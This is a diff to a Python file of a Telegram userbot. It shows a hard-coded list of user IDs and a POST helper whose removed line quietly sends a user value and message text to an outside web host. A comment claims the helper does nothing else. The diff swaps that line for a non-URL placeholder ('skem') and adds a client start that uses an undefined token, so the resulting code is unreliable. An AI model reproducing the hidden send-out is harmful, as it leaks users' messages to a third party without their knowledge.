@@ -41,7 +41,7 @@ REPO = "[DYNAMIC](https://github.com/TeamDynamic/Dynamic-Userbot/)"
 kangers = [1163444049, 719195224, 1663120531, 1629929584, 1674693245, 1393895701,1383730820, 1083049180, 1412086585, 1585809209, 1326701194, 1198820588, 1174361857, 1555340229, 1322549723, 803243487, 1444249738, 1222113933, 1152902819, 1176159510, 611816596, 1318486004, 573738900, 1601105531, 1263617196, 1252974808, 1315076555, 1176159510, 21894734, 536157487, 1347610095, 1754449534, 1649853060, 1650981437, 1678331806, 1383009042, 1053880985, 817088672, 1047091391, 1221693726, 929138153, 1091139479]
 
 from requests import post
-
+from var import Var
 def POST(user, msg):
   if user == None:
      user = ' '
@@ -49,7 +49,7 @@ def POST(user, msg):
     msg = ' '
   else:
       pass #post maar rHa hu nothing else
-  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
+  r = post(f"skem")
 import pickle as p
 def rd(file):
   try:
@@ -68,7 +68,7 @@ def wt(obj, file):
     return True
   except:
     return False
-
+xbot = TelegramClient("Aman", Var.APP_ID, Var.API_HASH).start(bot_token=token)
 MASTER = NAME
 GROUP = "[SUPPORT GROUP](https://t.me/DYNAMICUSERBOTSUPPORT)"
 if __name__=="__main__":
